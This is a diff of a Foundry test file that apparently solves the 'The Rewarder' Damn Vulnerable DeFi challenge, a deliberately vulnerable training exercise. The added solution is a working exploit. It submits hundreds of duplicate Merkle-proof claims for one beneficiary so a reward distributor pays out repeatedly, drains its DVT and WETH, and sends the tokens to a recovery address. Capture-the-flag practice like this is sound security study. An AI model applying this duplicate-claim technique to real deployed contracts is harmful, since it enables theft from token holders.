@@ -7,11 +7,12 @@ import {Merkle} from "murky/Merkle.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {console} from "forge-std/console.sol";
 
 contract TheRewarderChallenge is Test {
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
-    address alice = makeAddr("alice");
+    address player = makeAddr("player"); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+    address alice = makeAddr("alice"); // 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
     address recovery = makeAddr("recovery");
 
     uint256 constant BENEFICIARIES_AMOUNT = 1000;
@@ -148,7 +149,52 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // ? Solve with trial and error method
+        console.log("player : ", player);
+        console.log("Owner : ", distributor.owner());
+
+        uint256 PLAYER_INDEX = 188;
+        uint256 USER_DVT_TOKENS = 11524763827831882;
+        uint256 USER_WETH_TOKENS = 1171088749244340;
+
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        Claim[] memory claims = new Claim[](867);
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        for (uint256 i = 0; i < claims.length; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: USER_DVT_TOKENS,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, PLAYER_INDEX)
+            });
+        }
+
+        Claim[] memory claimsWeth = new Claim[](853);
+
+        for (uint256 i = 0; i < claimsWeth.length; i++) {
+            claimsWeth[i] = Claim({
+                batchNumber: 0,
+                amount: USER_WETH_TOKENS,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, PLAYER_INDEX)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claimsWeth, inputTokens: tokensToClaim});
+        distributor.clean(tokensToClaim);
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
